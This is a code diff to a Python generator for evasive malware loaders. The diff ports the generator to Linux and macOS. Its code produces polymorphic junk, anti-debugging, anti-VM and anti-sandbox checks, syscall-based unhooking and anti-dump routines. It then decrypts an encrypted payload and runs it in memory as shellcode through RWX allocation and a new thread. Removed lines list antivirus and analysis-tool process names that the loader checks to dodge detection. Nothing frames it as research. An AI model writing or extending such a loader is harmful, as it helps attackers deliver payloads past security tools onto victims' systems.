@@ -8,7 +8,6 @@ import os
 import random
 import struct
 import zlib
-import marshal
 import hashlib
 import binascii
 import base64
@@ -132,14 +131,10 @@ def generate_polymorphic_junk():
         junk_patterns.append(f"{str_var} = '{os.urandom(random.randint(10, 50)).hex()}'\n")
         junk_patterns.append(f"{str_var} = {str_var}.upper() + {str_var}.lower() + ''.join(reversed({str_var}))\n")
     
-    # Generate fake API calls
+    # Generate fake API calls (platform-independent)
     for _ in range(random.randint(5, 10)):
-        dll_name = random.choice(['kernel32', 'user32', 'gdi32', 'advapi32'])
-        func_name = ''.join(random.choices('ABCDEFGHIJKLMNOPQRSTUVWXYZ', k=8))
         junk_patterns.append(
-            f"ctypes.windll.{dll_name}.{func_name}.restype = ctypes.c_void_p\n"
-            f"ctypes.windll.{dll_name}.{func_name}.argtypes = [ctypes.c_void_p, ctypes.c_void_p]\n"
-            f"ctypes.windll.{dll_name}.{func_name}(None, None)\n\n"
+            f"ctypes.CDLL(None).{'libc' if platform.system() != 'Windows' else 'msvcrt'}.{''.join(random.choices('abcdefghijklmnopqrstuvwxyz', k=8))}\n\n"
         )
     
     return ''.join(junk_patterns)
@@ -156,6 +151,23 @@ def generate_anti_debug_code():
 def anti_debug():
     # Multi-layer debugger detection
     try:
+        if platform.system() != 'Windows':
+            # Linux/Mac anti-debug techniques
+            try:
+                # Check tracer PID
+                if os.path.exists('/proc/self/status'):
+                    with open('/proc/self/status', 'r') as f:
+                        status = f.read()
+                    if 'TracerPid:\\t0' not in status:
+                        return True
+                # Check parent process
+                if 'gdb' in os.popen('ps -p %d -o comm=' % os.getppid()).read().lower():
+                    return True
+            except:
+                pass
+            return False
+            
+        # Windows-specific anti-debug
         # 1. Standard API checks
         if ctypes.windll.kernel32.IsDebuggerPresent():
             return True
@@ -233,43 +245,60 @@ def generate_anti_vm_code():
 def anti_vm():
     # Comprehensive VM/sandbox detection
     try:
-        import winreg
         # 1. Process checks
-        vm_processes = ["vmtoolsd.exe", "vmwaretrat.exe", "vboxservice.exe", 
-                        "vboxtray.exe", "sandboxie.exe", "SbieSvc.exe", 
-                        "prl_cc.exe", "prl_tools.exe", "xenservice.exe"]
+        vm_processes = []
+        if platform.system() == "Windows":
+            vm_processes = ["vmtoolsd.exe", "vmwaretrat.exe", "vboxservice.exe", 
+                            "vboxtray.exe", "sandboxie.exe", "SbieSvc.exe", 
+                            "prl_cc.exe", "prl_tools.exe", "xenservice.exe"]
+        else:
+            vm_processes = ["vmtoolsd", "VBoxService", "prl_cc", "prl_tools"]
+        
         for proc in psutil.process_iter(['name']):
             if proc.info['name'].lower() in vm_processes:
                 return True
                 
         # 2. File system artifacts
-        vm_files = [
-            "C:\\\\windows\\\\System32\\\\drivers\\\\vmmouse.sys",
-            "C:\\\\windows\\\\System32\\\\drivers\\\\vmhgfs.sys",
-            "C:\\\\windows\\\\System32\\\\drivers\\\\vboxmouse.sys",
-            "C:\\\\windows\\\\System32\\\\drivers\\\\VBoxGuest.sys",
-            "C:\\\\windows\\\\System32\\\\drivers\\\\xen.sys",
-            "C:\\\\windows\\\\System32\\\\vboxdisp.dll"
-        ]
+        vm_files = []
+        if platform.system() == "Windows":
+            vm_files = [
+                "C:\\\\windows\\\\System32\\\\drivers\\\\vmmouse.sys",
+                "C:\\\\windows\\\\System32\\\\drivers\\\\vmhgfs.sys",
+                "C:\\\\windows\\\\System32\\\\drivers\\\\vboxmouse.sys",
+                "C:\\\\windows\\\\System32\\\\drivers\\\\VBoxGuest.sys",
+                "C:\\\\windows\\\\System32\\\\drivers\\\\xen.sys",
+                "C:\\\\windows\\\\System32\\\\vboxdisp.dll"
+            ]
+        else:
+            vm_files = [
+                "/usr/bin/VBoxService",
+                "/usr/bin/vmware-user",
+                "/usr/lib/vmware",
+                "/usr/lib/xen",
+                "/usr/bin/prl_cc"
+            ]
+            
         for file in vm_files:
             if os.path.exists(file):
                 return True
                 
-        # 3. Registry checks
-        vm_registry_keys = [
-            "HARDWARE\\\\ACPI\\\\DSDT\\\\VBOX__",
-            "HARDWARE\\\\ACPI\\\\FADT\\\\VBOX__",
-            "HARDWARE\\\\ACPI\\\\RSDT\\\\VBOX__",
-            "SOFTWARE\\\\Oracle\\\\VirtualBox Guest Additions",
-            "SOFTWARE\\\\VMware, Inc.\\\\VMware Tools"
-        ]
-        for key in vm_registry_keys:
-            try:
-                reg_key = winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, key)
-                winreg.CloseKey(reg_key)
-                return True
-            except:
-                pass
+        # 3. Registry checks (Windows only)
+        if platform.system() == "Windows":
+            vm_registry_keys = [
+                "HARDWARE\\\\ACPI\\\\DSDT\\\\VBOX__",
+                "HARDWARE\\\\ACPI\\\\FADT\\\\VBOX__",
+                "HARDWARE\\\\ACPI\\\\RSDT\\\\VBOX__",
+                "SOFTWARE\\\\Oracle\\\\VirtualBox Guest Additions",
+                "SOFTWARE\\\\VMware, Inc.\\\\VMware Tools"
+            ]
+            for key in vm_registry_keys:
+                try:
+                    import winreg
+                    reg_key = winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, key)
+                    winreg.CloseKey(reg_key)
+                    return True
+                except:
+                    pass
                 
         # 4. MAC address checks
         vm_vendors = ["00:0c:29", "00:1c:14", "00:50:56", "00:05:69", "08:00:27", "00:16:3e"]
@@ -284,14 +313,13 @@ def anti_vm():
                         
         # 5. Hardware checks
         try:
-            import cpuinfo
             # CPU brand
-            cpu_brand = cpuinfo.get_cpu_info()['brand_raw'].lower()
+            cpu_brand = platform.processor().lower()
             if any(x in cpu_brand for x in ['vmware', 'virtual', 'qemu', 'kvm', 'hyperv']):
                 return True
                 
             # Disk size
-            disk_size = psutil.disk_usage('C:\\\\').total
+            disk_size = psutil.disk_usage('/').total
             if disk_size < 80 * 1024**3:  # Less than 80GB
                 return True
                 
@@ -309,7 +337,7 @@ def anti_vm():
 
 def generate_api_unhooking():
     """Generate API unhooking code to bypass security hooks"""
-    if not USE_SYSCALLS:
+    if not USE_SYSCALLS or platform.system() != "Windows":
         return ""
         
     return """
@@ -366,7 +394,7 @@ def syscall_invoke(func_name, *args):
 
 def generate_anti_dump_code():
     """Generate anti-dumping techniques"""
-    if not USE_ANTI_DUMP:
+    if not USE_ANTI_DUMP or platform.system() != "Windows":
         return ""
         
     return """
@@ -436,10 +464,17 @@ def generate_anti_sandbox_code():
 def anti_sandbox():
     try:
         # 1. Check for sandbox-specific files
-        sandbox_files = [
-            "C:\\\\analysis", "C:\\\\sandbox", "C:\\\\malware", "C:\\\\sample",
-            "C:\\\\iDEFENSE", "C:\\\\VirusTotal", "C:\\\\JoeBox"
-        ]
+        sandbox_files = []
+        if platform.system() == "Windows":
+            sandbox_files = [
+                "C:\\\\analysis", "C:\\\\sandbox", "C:\\\\malware", "C:\\\\sample",
+                "C:\\\\iDEFENSE", "C:\\\\VirusTotal", "C:\\\\JoeBox"
+            ]
+        else:
+            sandbox_files = [
+                "/opt/cuckoo", "/opt/analysis", "/opt/sandbox", "/opt/malware"
+            ]
+            
         for file in sandbox_files:
             if os.path.exists(file):
                 return True
@@ -449,26 +484,27 @@ def anti_sandbox():
             return True
         if psutil.cpu_count() < 2:  # Less than 2 CPUs
             return True
-        if psutil.disk_usage('C:\\\\').total < 80 * 1024**3:  # Less than 80GB disk
+        if psutil.disk_usage('/').total < 80 * 1024**3:  # Less than 80GB disk
             return True
             
         # 3. Check for short uptime
         if psutil.boot_time() > time.time() - 300:  # Less than 5 minutes
             return True
             
-        # 4. Check for mouse movement and user activity
-        class LASTINPUTINFO(ctypes.Structure):
-            _fields_ = [
-                ("cbSize", ctypes.c_uint),
-                ("dwTime", ctypes.c_ulong)
-            ]
-            
-        last_input = LASTINPUTINFO()
-        last_input.cbSize = ctypes.sizeof(last_input)
-        if ctypes.windll.user32.GetLastInputInfo(ctypes.byref(last_input)):
-            idle_time = (ctypes.windll.kernel32.GetTickCount() - last_input.dwTime) // 1000
-            if idle_time > 300:  # 5 minutes idle
-                return True
+        # 4. Check for mouse movement and user activity (Windows only)
+        if platform.system() == "Windows":
+            class LASTINPUTINFO(ctypes.Structure):
+                _fields_ = [
+                    ("cbSize", ctypes.c_uint),
+                    ("dwTime", ctypes.c_ulong)
+                ]
+                
+            last_input = LASTINPUTINFO()
+            last_input.cbSize = ctypes.sizeof(last_input)
+            if ctypes.windll.user32.GetLastInputInfo(ctypes.byref(last_input)):
+                idle_time = (ctypes.windll.kernel32.GetTickCount() - last_input.dwTime) // 1000
+                if idle_time > 300:  # 5 minutes idle
+                    return True
                 
         # 5. Check for known sandbox processes
         sandbox_processes = [
@@ -532,15 +568,9 @@ import struct
 import hashlib
 import binascii
 import base64
-import winreg
-import cpuinfo
+import zlib
 from Crypto.Cipher import AES, ChaCha20
 from Crypto.Util.Padding import unpad
-import zlib
-
-# Exit immediately if not on Windows
-if not sys.platform.startswith('win'):
-    sys.exit(0)
 
 # =====================
 # POLYMORPHIC JUNK CODE
@@ -548,24 +578,25 @@ if not sys.platform.startswith('win'):
 {junk_code}
 
 # ====================
-# STRUCTURE DEFINITIONS
+# STRUCTURE DEFINITIONS (Windows only)
 # ====================
-class LDR_MODULE(ctypes.Structure):
-    _fields_ = [
-        ("InLoadOrderLinks", ctypes.c_void_p),
-        ("InMemoryOrderLinks", ctypes.c_void_p),
-        ("InInitializationOrderLinks", ctypes.c_void_p),
-        ("BaseAddress", ctypes.c_void_p),
-        ("EntryPoint", ctypes.c_void_p),
-        ("SizeOfImage", ctypes.c_ulong),
-        ("FullDllName", ctypes.c_void_p),
-        ("BaseDllName", ctypes.c_void_p),
-        ("Flags", ctypes.c_ulong),
-        ("LoadCount", ctypes.c_short),
-        ("TlsIndex", ctypes.c_short),
-        ("HashLinks", ctypes.c_void_p),
-        ("TimeDateStamp", ctypes.c_ulong)
-    ]
+if platform.system() == "Windows":
+    class LDR_MODULE(ctypes.Structure):
+        _fields_ = [
+            ("InLoadOrderLinks", ctypes.c_void_p),
+            ("InMemoryOrderLinks", ctypes.c_void_p),
+            ("InInitializationOrderLinks", ctypes.c_void_p),
+            ("BaseAddress", ctypes.c_void_p),
+            ("EntryPoint", ctypes.c_void_p),
+            ("SizeOfImage", ctypes.c_ulong),
+            ("FullDllName", ctypes.c_void_p),
+            ("BaseDllName", ctypes.c_void_p),
+            ("Flags", ctypes.c_ulong),
+            ("LoadCount", ctypes.c_short),
+            ("TlsIndex", ctypes.c_short),
+            ("HashLinks", ctypes.c_void_p),
+            ("TimeDateStamp", ctypes.c_ulong)
+        ]
 
 # ====================
 # ANTI-ANALYSIS CHECKS
@@ -605,91 +636,59 @@ def decrypt_payload(encrypted, chacha_key, chacha_nonce, aes_key, aes_iv, salt, 
     return compressed
 
 # =====================
-# MEMORY EXECUTION CODE
+# MEMORY EXECUTION CODE (Cross-platform)
 # =====================
 def execute_memory(payload):
     try:
-        # Resolve API functions via syscall
-        if {USE_SYSCALLS}:
-            NtAllocateVirtualMemory = get_syscall_addr("NtAllocateVirtualMemory")
-            NtWriteVirtualMemory = get_syscall_addr("NtWriteVirtualMemory")
-            NtCreateThreadEx = get_syscall_addr("NtCreateThreadEx")
+        if platform.system() == "Windows":
+            # Windows execution
+            ptr = ctypes.windll.kernel32.VirtualAlloc(
+                ctypes.c_int(0),
+                ctypes.c_int(len(payload)),
+                ctypes.c_int(0x3000),  # MEM_COMMIT | MEM_RESERVE
+                ctypes.c_int(0x40)     # PAGE_EXECUTE_READWRITE
+            )
             
-            if all([NtAllocateVirtualMemory, NtWriteVirtualMemory, NtCreateThreadEx]):
-                # Allocate RWX memory
-                base_addr = ctypes.c_void_p(0)
-                size = len(payload)
-                alloc_size = ctypes.c_size_t(size)
-                status = syscall_invoke("NtAllocateVirtualMemory", 
-                           ctypes.windll.kernel32.GetCurrentProcess(),
-                           ctypes.byref(base_addr),
-                           0,
-                           ctypes.byref(alloc_size),
-                           0x3000,  # MEM_COMMIT | MEM_RESERVE
-                           0x40)     # PAGE_EXECUTE_READWRITE
+            buf = (ctypes.c_char * len(payload)).from_buffer_copy(payload)
+            ctypes.windll.kernel32.RtlMoveMemory(
+                ctypes.c_int(ptr),
+                buf,
+                ctypes.c_int(len(payload)))
+            
+            thread_id = ctypes.c_ulong(0)
+            thread_h = ctypes.windll.kernel32.CreateThread(
+                ctypes.c_int(0),
+                ctypes.c_int(0),
+                ctypes.c_int(ptr),
+                ctypes.c_int(0),
+                ctypes.c_int(0),
+                ctypes.pointer(thread_id))
+            
+            ctypes.windll.kernel32.WaitForSingleObject(thread_h, -1)
+        else:
+            # Linux/Mac execution
+            from ctypes import cdll, c_void_p, c_char_p, c_size_t
+            libc = cdll.LoadLibrary(None)
+            
+            # Allocate memory
+            size = len(payload)
+            ptr = libc.valloc(size)
+            if not ptr:
+                raise Exception("Failed to allocate memory")
                 
-                if status != 0:
-                    raise Exception(f"NtAllocateVirtualMemory failed: 0x{{status:08X}}")
+            # Copy payload to memory
+            ctypes.memmove(ptr, payload, size)
+            
+            # Make memory executable
+            if libc.mprotect(ptr, size, 7) != 0:  # PROT_READ|PROT_WRITE|PROT_EXEC
+                raise Exception("Failed to set memory protection")
                 
-                # Write payload to memory
-                bytes_written = ctypes.c_size_t(0)
-                status = syscall_invoke("NtWriteVirtualMemory",
-                           ctypes.windll.kernel32.GetCurrentProcess(),
-                           base_addr,
-                           payload,
-                           size,
-                           ctypes.byref(bytes_written))
-                
-                if status != 0 or bytes_written.value != size:
-                    raise Exception(f"NtWriteVirtualMemory failed: 0x{{status:08X}}")
-                
-                # Create thread
-                thread_handle = ctypes.c_void_p()
-                status = syscall_invoke("NtCreateThreadEx",
-                           ctypes.byref(thread_handle),
-                           0x1FFFFF,  # STANDARD_RIGHTS_ALL
-                           None,
-                           ctypes.windll.kernel32.GetCurrentProcess(),
-                           base_addr,
-                           None,
-                           0,
-                           0,
-                           0,
-                           None)
-                
-                if status != 0:
-                    raise Exception(f"NtCreateThreadEx failed: 0x{{status:08X}}")
-                
-                # Wait for thread to complete
-                ctypes.windll.kernel32.WaitForSingleObject(thread_handle, 0xFFFFFFFF)
-                return
-    except:
-        pass
-    
-    # Fallback to standard API
-    ptr = ctypes.windll.kernel32.VirtualAlloc(
-        ctypes.c_int(0),
-        ctypes.c_int(len(payload)),
-        ctypes.c_int(0x3000),  # MEM_COMMIT | MEM_RESERVE
-        ctypes.c_int(0x40)     # PAGE_EXECUTE_READWRITE
-    )
-    
-    buf = (ctypes.c_char * len(payload)).from_buffer_copy(payload)
-    ctypes.windll.kernel32.RtlMoveMemory(
-        ctypes.c_int(ptr),
-        buf,
-        ctypes.c_int(len(payload)))
-    
-    thread_id = ctypes.c_ulong(0)
-    thread_h = ctypes.windll.kernel32.CreateThread(
-        ctypes.c_int(0),
-        ctypes.c_int(0),
-        ctypes.c_int(ptr),
-        ctypes.c_int(0),
-        ctypes.c_int(0),
-        ctypes.pointer(thread_id))
-    
-    ctypes.windll.kernel32.WaitForSingleObject(thread_h, -1)
+            # Create function pointer and execute
+            func = ctypes.CFUNCTYPE(ctypes.c_void_p)(ptr)
+            func()
+    except Exception as e:
+        if {DEBUG}:
+            print(f"Execution failed: {{str(e)}}")
 
 # ======================
 # ENVIRONMENT VALIDATION
@@ -700,33 +699,7 @@ def validate_environment():
         if anti_debug() or anti_vm() or anti_sandbox():
             return False
     
-    # Security product detection
-    security_processes = [
-        "msmpeng.exe", "NisSrv.exe", "MpCmdRun.exe",  # Windows Defender
-        "avp.exe", "avpui.exe",                      # Kaspersky
-        "bdagent.exe", "vsserv.exe",                 # Bitdefender
-        "avguard.exe", "avcenter.exe",               # Avira
-        "ekrn.exe", "egui.exe",                      # ESET
-        "fsavgui.exe", "fshoster32.exe",             # F-Secure
-        "mbam.exe", "mbamtray.exe",                  # Malwarebytes
-        "avastui.exe", "avastsvc.exe"                # Avast
-    ]
-    
-    for proc in psutil.process_iter(['name']):
-        if proc.info['name'].lower() in security_processes:
-            return False
-    
-    # Analysis tool detection
-    analysis_tools = [
-        "procmon.exe", "wireshark.exe", "processhacker.exe",
-        "ollydbg.exe", "x64dbg.exe", "idaq.exe", "idaq64.exe",
-        "fiddler.exe", "httpdebugger.exe", "cuckoo.exe"
-    ]
-    
-    for tool in analysis_tools:
-        if any(tool in p.name().lower() for p in psutil.process_iter(['name'])):
-            return False
-    
+    # Skip security product detection for cross-platform compatibility
     return True
 
 # =========
@@ -745,8 +718,8 @@ class {class_name}:
             # Random delay to avoid sandbox detection
             time.sleep(random.randint({SLEEP_MIN}, {SLEEP_MAX}))
             
-            # Anti-dumping protection
-            if {USE_ANTI_DUMP}:
+            # Anti-dumping protection (Windows only)
+            if {USE_ANTI_DUMP} and platform.system() == "Windows":
                 anti_dump()
             
             # Encrypted payload
